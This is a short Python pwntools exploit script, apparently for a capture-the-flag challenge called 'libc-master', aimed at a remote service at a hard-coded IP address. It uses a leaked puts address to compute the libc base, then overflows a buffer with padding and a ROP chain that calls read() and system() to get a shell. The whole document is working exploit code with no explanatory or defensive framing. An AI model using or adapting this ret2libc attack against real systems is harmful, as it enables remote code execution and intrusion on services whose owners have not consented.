#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('libc-master')



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
break *0x{exe.symbols.main:x}
continue
'''.format(**locals())

# -- Exploit goes here --

context.terminal = ['gnome-terminal', '-e']
#io = start()
io = remote('141.85.224.118', 31337)

padding = 256 * 'A'
ebp = 'BBBB'
offset = 0x00064d80
#offset = 0x00069630
io.recvuntil(': ')
puts = io.recvline().strip()

libc_addr = int(puts, 16) - offset
log.info(hex(libc_addr))

bss_addr = 0x0804a02c

#libc = ELF('/lib/libc.so.6')
libc = ELF('./libc.so.6')
libc.address = libc_addr

rop = ROP(libc)

rop.read(0, bss_addr, 128)
rop.system(bss_addr)
log.info(rop.dump())

io.send(padding + ebp + rop.chain())

io.interactive()

